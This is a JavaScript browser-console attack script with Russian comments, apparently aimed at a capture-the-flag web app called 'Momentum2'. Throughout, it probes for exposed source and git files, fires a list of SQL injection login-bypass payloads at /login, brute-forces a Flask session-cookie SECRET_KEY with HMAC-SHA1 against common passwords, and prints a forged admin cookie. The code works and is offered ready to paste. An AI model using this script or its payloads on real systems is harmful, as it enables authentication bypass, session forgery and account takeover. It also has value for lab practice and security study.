/* Momentum2 — оставшиеся поверхности, всё в консоли браузера.
 *
 *  1. статики и исходники (/static/app.js, .map, /.git/config, ...)
 *  2. /login: сигнал по ЗАГОЛОВКУ страницы + выставилась ли кука
 *  3. сессионная кука: разбор + подбор SECRET_KEY через WebCrypto (HMAC-SHA1)
 *
 * Если секрет найдётся — печатает готовую подделанную куку для document.cookie.
 * Вставить целиком, дождаться вывода (~5-15 секунд).
 */
(async () => {
  const sleep = ms => new Promise(r => setTimeout(r, ms));
  const log = (a, b) => console.log('%c' + String(a).padEnd(30) + '%c' + b,
    'color:#0a0;font-weight:bold', 'color:inherit');

  const title = html => {
    const m = html.match(/<title>([\s\S]*?)<\/title>/i);
    return m ? m[1].trim().slice(0, 40) : '';
  };
  const getText = async p => {
    try { const r = await fetch(p, { credentials: 'include' }); return { status: r.status, body: await r.text() }; }
    catch (e) { return { status: 0, body: String(e) }; }
  };
  const postText = async (p, data) => {
    try {
      const r = await fetch(p, {
        method: 'POST', credentials: 'include',
        headers: { 'Content-Type': 'application/x-www-form-urlencoded', accept: '*/*' },
        body: new URLSearchParams(data),
      });
      return { status: r.status, body: await r.text(), cookies: r.headers.getSetCookie ? r.headers.getSetCookie() : [] };
    } catch (e) { return { status: 0, body: String(e), cookies: [] }; }
  };

  // ---------- 1. статики ----------

  console.log('%c=== 1. статики ===', 'color:#e90;font-weight:bold');
  const statics = ['/static/app.js', '/static/main.js', '/static/app.js.map',
                   '/app.py', '/source', '/static/', '/.git/config', '/static/style.css'];
  for (const p of statics) {
    const r = await getText(p);
    let note = r.body.length > 20 ? `len=${r.body.length}` : '';
    if (r.status === 200 && r.body.length > 20) {
      const low = r.body.toLowerCase();
      const hits = ['secret', 'session', 'api/', 'fetch(', 'flag{', 'password'].filter(k => low.includes(k));
      if (hits.length) note += ' [' + hits.join(',') + ']';
    }
    log(p, r.status + '  ' + note);
    if (p.endsWith('.js') && r.status === 200) {
      const eps = [...new Set([...r.body.matchAll(/['"](\/[a-z0-9_\-/.]{3,40})['"]/gi)].map(m => m[1]))];
      if (eps.length) console.log('      пути в js:', eps.slice(0, 25));
      const sus = [...r.body.matchAll(/["']([^"']{0,40}(?:secret|key|flag)[^"']{0,40})["']/gi)].map(m => m[1]);
      if (sus.length) console.log('      подозрительное:', sus.slice(0, 10));
    }
    await sleep(60);
  }

  // ---------- 2. логин ----------

  console.log('%c=== 2. /login (сигнал по <title>) ===', 'color:#e90;font-weight:bold');
  const base = await getText('/login');
  log('GET /login', base.status + '  title=' + JSON.stringify(title(base.body)));
  const user = 'h' + Math.random().toString(36).slice(2, 8);
  const reg = await postText('/register', { username: user, password: 'Pa55word!x' });
  log('register ' + user, reg.status + '  title=' + JSON.stringify(title(reg.body)));

  const probe = async (label, data) => {
    const r = await postText('/login', data);
    const t = title(r.body);
    log(label, r.status + '  title=' + JSON.stringify(t) + '  cookie=' + (r.cookies.length ? 'да' : 'нет'));
    return t;
  };
  const good = await probe('верный пароль', { username: user, password: 'Pa55word!x' });
  const bad = await probe('неверный пароль', { username: user, password: 'wrong' });
  console.log('%cдифференциал: верный=' + JSON.stringify(good) + ' vs неверный=' + JSON.stringify(bad),
    good !== bad ? 'color:#0a0;font-weight:bold' : 'color:#e33;font-weight:bold');
  if (good === bad) console.log('  одинаковые — оракула по логину нет');

  const payloads = [
    ["' OR 1=1--", 'x'],
    ["' OR 1=1-- -", 'x'],
    ["' OR '1'='1", "' OR '1'='1"],
    [user, "' OR '1'='1"],
    [user, "x' OR '1'='1'--"],
    ['admin', 'admin'],
    ["admin'--", 'x'],
    ["' OR 1=1 LIMIT 1--", 'x'],
    ["' UNION SELECT 1,2,3--", 'x'],
    ["%' OR username LIKE '%", 'x'],
  ];
  for (const [u, p] of payloads) {
    const t = await probe('u=' + JSON.stringify(u.slice(0, 20)), { username: u, password: p });
    if (t === good) console.log('%c  *** ЭТОТ ПЕЙЛОАД ПРОШЁЛ (title как у верного пароля) ***',
      'color:#0a0;font-weight:bold');
    await sleep(100);
  }

  // ---------- 3. сессия ----------

  console.log('%c=== 3. сессионная кука ===', 'color:#e90;font-weight:bold');
  const jar = () => Object.fromEntries(document.cookie.split(';').map(s => s.trim()).filter(Boolean)
    .map(s => [s.slice(0, s.indexOf('=')), s.slice(s.indexOf('=') + 1)]));
  const ck = jar();
  log('куки в браузере', JSON.stringify(Object.keys(ck)));
  const sName = Object.keys(ck).find(k => k.toLowerCase().includes('session')) || Object.keys(ck)[0];
  if (!sName) { console.log('  куки нет — не вошли?'); return; }
  const val = ck[sName];
  log('имя', sName + ' (len=' + val.length + ')');

  const b64uDec = s => {
    s = s.replace(/-/g, '+').replace(/_/g, '/');
    while (s.length % 4) s += '=';
    const bin = atob(s);
    return Uint8Array.from(bin, c => c.charCodeAt(0));
  };
  const b64uEnc = u8 => btoa(String.fromCharCode(...u8)).replace(/\+/g, '-').replace(/\//g, '_').replace(/=+$/, '');

  const parts = val.split('.');
  log('частей через точку', parts.length);
  if (parts.length >= 2) {
    try {
      let raw = b64uDec(parts[0]);
      if (raw[0] === 0x2e && typeof DecompressionStream !== 'undefined') {
        const ds = new DecompressionStream('deflate');
        const buf = await new Response(new Blob([raw.slice(1)]).stream().pipeThrough(ds)).arrayBuffer();
        raw = new Uint8Array(buf);
      }
      console.log('  payload:', new TextDecoder().decode(raw).slice(0, 300));
    } catch (e) { console.log('  payload не разобрался:', e.message); }
  }

  if (parts.length !== 3) {
    console.log('  не itsdangerous-формат (не 3 части) — свой формат куки');
    return;
  }

  const [p0, ts, sig] = parts;
  const value = p0 + '.' + ts;
  const enc = new TextEncoder();
  const hmacSha1 = async (keyBytes, msgBytes) => {
    const k = await crypto.subtle.importKey('raw', keyBytes, { name: 'HMAC', hash: 'SHA-1' }, false, ['sign']);
    return new Uint8Array(await crypto.subtle.sign('HMAC', k, msgBytes));
  };

  const SECRETS = ['secret', 'secretkey', 'secret_key', 'dev', 'development', 'flask',
    'changeme', 'password', 'momentum', 'Momentum', 'momentum2', 'ctf', 'flag',
    'super-secret', 'super-secret-key', 'your-secret-key', 'test', 'admin', 'key',
    '1234', 's3cr3t', 'supersecret', 'momentum-secret', 'MOMENTUM', 'trader', 'elite', 'promo'];

  console.log('  пробую ' + SECRETS.length + ' частых секретов...');
  let found = null;
  for (const s of SECRETS) {
    const derived = await hmacSha1(enc.encode(s), enc.encode('cookie-session'));
    const test = b64uEnc(await hmacSha1(derived, enc.encode(value)));
    if (test === sig) { found = s; break; }
  }

  if (found) {
    console.log('%c  *** СЕКРЕТ: "' + found + '" ***', 'color:#0a0;font-size:15px;font-weight:bold');
    // пример: подписать свой payload тем же ключом
    const derived = await hmacSha1(enc.encode(found), enc.encode('cookie-session'));
    const demo = btoa(JSON.stringify({ uid: 1 })).replace(/\+/g, '-').replace(/\//g, '_').replace(/=+$/, '');
    const t = Math.floor(Date.now() / 1000);
    const v = demo + '.' + t;
    const nsig = b64uEnc(await hmacSha1(derived, enc.encode(v)));
    console.log('  пример подделанной куки (uid=1):');
    console.log('  document.cookie = ' + JSON.stringify(sName + '=' + v + '.' + nsig + '; path=/'));
  } else {
    console.log('  ни один из ' + SECRETS.length + ' не подошёл (секрет случайный)');
  }
})();
